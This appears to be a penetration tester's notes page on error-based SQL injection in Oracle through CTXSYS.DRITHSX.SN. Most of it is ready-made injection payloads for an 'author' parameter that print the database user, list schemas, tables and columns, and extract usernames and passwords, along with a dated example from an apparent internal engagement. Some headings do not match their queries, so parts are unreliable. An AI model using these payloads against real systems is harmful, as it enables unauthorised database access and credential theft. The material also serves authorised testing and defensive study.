# Oracle

## Error base oracle SQLi

> [https://dl.packetstormsecurity.net/papers/database/Hacking\_Oracle\_From\_Web\_2.pdf](https://dl.packetstormsecurity.net/papers/database/Hacking_Oracle_From_Web_2.pdf)  
> [http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)  
> [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md\#oracle-sql-injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md#oracle-sql-injection)

### CTXSYS.DRITHSX.SN

```text
ctxsys.drithsx.sn(1,(sql query to execute))
```

#### Example

```text
author=1' and 1=ctxsys.drithsx.sn(1,(select user from dual))--
```

> Something went wrong with the search: java.sql.SQLException: ORA-20000: Oracle Text error: DRG-11701: thesaurus **WEB\_APP** does not exist ORA-06512: at "CTXSYS.DRUE", line 183 ORA-06512: at "CTXSYS.DRITHSX", line 555 ORA-06512: at line 1

## Limit to one result

### Get all databases

![](../../.gitbook/assets/image%20%2816%29.png)

```text
SELECT OWNER FROM (SELECT OWNER,ROWNUM AS LIMIT FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES) ORDER BY 1 ASC) WHERE LIMIT=1
```

### Get all table within the WEB\_APP database

![](../../.gitbook/assets/image%20%2814%29.png)

```text
SELECT table_name FROM (SELECT table_name,ROWNUM AS LIMIT FROM (SELECT owner, table_name FROM all_taÂ­bles WHERE owner=WEB_APP) ORDER BY 1 ASC) WHERE LIMIT=1
```

### Get all columns within the WEB\_APP database and WEB\_ADMINS table

![](../../.gitbook/assets/image%20%2815%29.png)

```text
author=1' AND 2092=CTXSYS.DRITHSX.SN(2092,(SELECT column_name FROM (SELECT column_name,ROWNUM AS LIMIT FROM (SELECT column_name FROM all_tab_columns WHERE owner='WEB_APP' and table_name='WEB_ADMINS') ORDER BY 1 ASC) WHERE LIMIT=1))--
```

### Select from the WEB\_APP.WEB\_ADMINS table

![](../../.gitbook/assets/image%20%2813%29.png)

```text
author=1' AND 2092=CTXSYS.DRITHSX.SN(2092,(SELECT PASSWORD FROM (SELECT PASSWORD,ROWNUM AS LIMIT FROM (SELECT PASSWORD FROM WEB_APP.WEB_ADMINS) ORDER BY 1 ASC) WHERE LIMIT=1))--
```

### Example

#### 15-05-2021 - RFC1918

#### Oracle Error SQLi - Error Messages Enabled

**Getting current user**

author=1' and 1=ctxsys.drithsx.sn\(1,\(select user from dual\)\)--

**Getting current DB**

author=1' and 1=ctxsys.drithsx.sn\(1,\(SELECT global\_name FROM global\_name\)\)--

**Listing DB's**

author=1' AND 2092=CTXSYS.DRITHSX.SN\(2092,\(SELECT OWNER FROM \(SELECT OWNER,ROWNUM AS LIMIT FROM \(SELECT DISTINCT\(OWNER\) FROM SYS.ALL\_TABLES\) ORDER BY 1 ASC\) WHERE LIMIT=7\)\)--

**Listing Tables from WEB\_APP DB**

author=1' AND 2092=CTXSYS.DRITHSX.SN\(2092,\(SELECT table\_name FROM \(SELECT table\_name,ROWNUM AS LIMIT FROM \(SELECT owner, table\_name FROM all\_tables WHERE owner='WEB\_APP'\) ORDER BY 1 ASC\) WHERE LIMIT=1\)\)--

**Listing Columns from WEB\_APP DB and WEB\_ADMINS table**

author=1' AND 2092=CTXSYS.DRITHSX.SN\(2092,\(SELECT column\_name FROM \(SELECT column\_name,ROWNUM AS LIMIT FROM \(SELECT column\_name FROM all\_tab\_columns WHERE owner='WEB\_APP' and table\_name='WEB\_CONTENT'\) ORDER BY 1 ASC\) WHERE LIMIT=2\)\)--

**Select password from WEB\_APP.WEB\_ADMINS**

author=1' AND 2092=CTXSYS.DRITHSX.SN\(2092,\(SELECT PASSWORD FROM \(SELECT PASSWORD,ROWNUM AS LIMIT FROM \(SELECT PASSWORD FROM WEB\_APP.WEB\_USERS\) ORDER BY 1 ASC\) WHERE LIMIT=1\)\)--

**Select Username and password from WEB\_USERS**

Username: author=1' AND 2092=CTXSYS.DRITHSX.SN\(2092,\(SELECT USER\_NAME FROM \(SELECT USER\_NAME,ROWNUM AS LIMIT FROM \(SELECT USER\_NAME FROM WEB\_APP.WEB\_USERS\) ORDER BY 1 ASC\) WHERE LIMIT=1\)\)--

Password: author=1' AND 2092=CTXSYS.DRITHSX.SN\(2092,\(SELECT PASSWORD FROM \(SELECT PASSWORD,ROWNUM AS LIMIT FROM \(SELECT PASSWORD FROM WEB\_APP.WEB\_USERS\) ORDER BY 1 ASC\) WHERE LIMIT=1\)\)--

